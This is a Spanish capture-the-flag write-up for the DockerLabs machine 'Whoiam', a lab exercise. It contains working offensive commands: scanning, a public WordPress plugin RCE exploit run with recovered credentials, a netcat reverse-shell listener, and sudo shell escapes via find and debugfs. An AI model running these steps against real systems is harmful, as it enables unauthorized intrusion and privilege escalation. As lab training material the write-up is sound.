# Whoiam — DockerLabs.es 🐳
<img width="547" height="297" alt="1" src="https://github.com/user-attachments/assets/c43fe172-0fd7-407e-93e2-5686283d9d65" />

**Plataforma**: DockerLabs | **OS**: Linux | **Dificultad**: Fácil

---

## 1. Reconocimiento

Iniciamos con un escaneo en nmap:

```bash
sudo nmap -p- --min-rate 2000 -A -sS -Pn -n 172.18.0.2 -oN escaneo.txt
```
<img width="639" height="311" alt="2" src="https://github.com/user-attachments/assets/79edd123-afa5-4972-9562-f3641df51ddf" />


Entramos a la web para ver el contenido.

<img width="863" height="474" alt="3" src="https://github.com/user-attachments/assets/332b0d72-4b27-47cc-adc9-d6f3cb14a950" />


Al parecer no hay nada interesante, por lo que opto por hacer un fuzzing web con gobuster:

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,py,php,sh,html
```
<img width="797" height="340" alt="4" src="https://github.com/user-attachments/assets/274beade-f067-4bfb-801d-04f2e1ad1820" />


Encontramos el directorio `/wp-login.php` — hay un WordPress corriendo.

<img width="916" height="572" alt="5" src="https://github.com/user-attachments/assets/8ad15660-f52b-4c43-ab90-b6443c5e9e72" />


Después de una búsqueda exhaustiva de usuario o algún tipo de información nos encontramos con el directorio “/backups” la cuál contiene un archivo con credenciales.

<img width="696" height="346" alt="6" src="https://github.com/user-attachments/assets/84fe4ea0-6dd2-488b-a603-c8a5bcbc6f1d" />


Luego de descargarlo y descomprimirlo, leemos el archivo extraído y nos muestra estos datos.

<img width="500" height="113" alt="7" src="https://github.com/user-attachments/assets/d44b1b3c-1b7b-4feb-a0c7-d5abf72e3a1c" />


Las probamos en el panel de login de WordPress y obtenemos acceso al panel de administración.

<img width="1356" height="582" alt="8" src="https://github.com/user-attachments/assets/6755cbc4-4e32-4808-8d4f-b5a00caa4efe" />



---

## 2. Explotación

Para explotar el wordpress primero miramos los plugins instalados:

<img width="1104" height="539" alt="9" src="https://github.com/user-attachments/assets/c4812079-15b1-4e0b-a5dd-3b4cca13e49b" />

Y como vemos, hay instalado un plugin llamado “Modern Events Calendar” por lo que podemos buscarlo en searchsploit

<img width="1288" height="173" alt="10" src="https://github.com/user-attachments/assets/6f669c8b-deb0-4acf-bb25-88f7eca6e0bd" />


Encontramos un exploit de RCE (Remote Code Execution). Lo descargamos y ejecutamos:

```bash
searchsploit -m php/webapps/50082.py

python 50082.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
```

El output nos devuelve una URL con una webshell. Nos ponemos en escucha con netcat y enviamos una reverse shell desde la webshell.

```bash
nc -lvnp 443
```

Logramos acceso inicial al sistema.

---

## 3. Escalada de Privilegios

### www-data → rafa

Ejecutamos `sudo -l` y vemos que podemos usar `find` como el usuario **rafa**:

```bash
sudo -u rafa /usr/bin/find . -exec /bin/sh \; -quit
```

### rafa → ruben

Volvemos a ejecutar `sudo -l` como rafa y vemos que podemos usar `debugfs` como **ruben**:

```bash
sudo -u ruben /usr/sbin/debugfs
!/bin/bash
```

### ruben → root

En `/opt` encontramos un script que se ejecuta con privilegios. El script compara el input con el número 42, pero podemos inyectar un comando almacenado en una variable de entorno para ejecutarlo como root.

**✅ Máquina rooteada con éxito.**

---

## 4. Técnicas utilizadas

- Fuzzing web con Gobuster
- Credenciales encontradas en directorio `/backups`
- Explotación de plugin WordPress vulnerable (Modern Events Calendar - RCE)
- Escalada de privilegios con `find` (GTFObins)
- Escalada de privilegios con `debugfs` (GTFObins)
- Inyección de comandos en script
